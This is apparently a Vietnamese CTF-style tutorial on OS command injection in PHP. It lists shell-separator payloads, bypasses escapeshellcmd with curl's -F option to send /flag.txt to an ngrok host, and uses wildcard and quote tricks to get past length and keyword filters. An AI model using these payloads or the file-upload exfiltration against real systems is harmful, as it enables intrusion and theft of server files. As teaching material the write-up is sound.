Lỗ hỏng OS Command Inject xảy ra khi trong trang web có 1 hàm sử dụng để thực thi hệ thống shell và những dữ liệu này không được filter hoặc filter yếu dẫn đến attack sẽ chèn mã độc để tùy chỉnh shell
## VD 1: 
- Có url http://example.com/ping?ip=8.8.8.8 dùng để ping, với code php là `system("ping -c 1 " . $_GET['ip']);` thì khi đó data không được filter mà sử dụng lun, ta sẽ chèn thêm vào vd:
  + ?ip=google.com;whoami
  + ?ip=google.com&whoami
  + ?ip=google.com&&whoami
  + ?ip=google.com||whoami
  + ?ip=google.com|whoami
  + ?ip=google.com$(whoami)
  + ?ip=google.com`whoami` (hoặc sử dụng các kí tự đó dưới sạng url encode)
## VD 2:
- ta có đoạn mã sau:
  ```php
  if(isset($_POST['url'])){
  $url = $_POST['url'];
  if(strpos($url, 'http') !== 0 ){
      die('Only HTTP or HTTPS !');
  }else{
      $result = shell_exec('curl '. escapeshellcmd($url));
      $cache_file = './cache/'.md5($url);
      file_put_contents($cache_file, $result);
      $data = parse_html($cache_file);      
  }
Ở đây ta thấy `$result = shell_exec('curl '. escapeshellcmd($url));` là câu lệnh thực hiện shell, nhưng data được để trong hàm `escapeshellcmd()` của php có ý nghĩ là khi có các kí tự như:` ;, &&, ||, |, &, !, >, <, ` thì hàm sẽ thêm dấu `\` trước các kí tự đó
để cú pháp đó không được thực thi trong shell. Từ đó không thể pypass được challenge này nếu đi theo hướng sử dụng các kí tự để chạy lệnh được. Thay vì inject câu lệnh để server thực thi ta có thể tận dụng hàm curl để có thể đọc 1 file nào đó trên server bằng
cách gửi file đó về server do ta dựng lên. Curl cung cấp option -F cho phép gửi file từ hệ thống. Ta sẽ sử dụng ngrok để tạo 1 server vd `https://4706-113-185-53-154.ngrok-free.app/`  thì trong câu lệnh sẽ là để gửi sẽ là
`curl -F file=@/flag.txt https://4706-113-185-53-154.ngrok-free.app/` thì suy ra ta chỉ cần thêm vào payload=`-F file=@/flag.txt https://4706-113-185-53-154.ngrok-free.app/` tuy nhiên khi ta ấn gửi request này đi thì nó sẽ
gửi về thông báo `Only HTTP or HTTPS!` có vẻ hơi lắc leo nhưng ta chỉ cần sửa lại là `curl http:example.com -F file=@flag.txt https://4706-113-185-53-154.ngrok-free.app/` là có thể vượt qua
## VD3:
giả sử có 1 trang web dùng để lệnh thực thi từ xa. Nhưng có một số lệnh như: ls, cat, sh,... bị chặn và chỉ được nhập tối đa 4 kí tự như id để xem #id..., nếu nhập lệnh ls vào web thì sẽ có thông báo valid..., thế nhưng tôi sử dụng pypass `l's'` thì nó lại sử dụng được. Tiếp theo đến xử lí phần giới hạn 4 char: thì khi ta nhập `cat flag.txt` thì sẽ không được cho vượt qua length cho phép, ta sẽ sử dụng 1 trick là:     
  + Bước 1: ta sẽ nhập `>cat` để server tạo ra file cat rỗng
  + Bước 2: ta sẽ nhập `*` thì lúc này server sẽ gửi về flag ta cần. Thế là ta chỉ cần * để lấy được flag =)). thì kí tự * trong linux sẽ thực hiện ghi tên các file trong folder thì ở 1 lúc nào đó nó sẽ là `cat flag.txt` thì ngay lập tức lệnh sẽ chạy và ta có thể tận dụng lỗi này được.

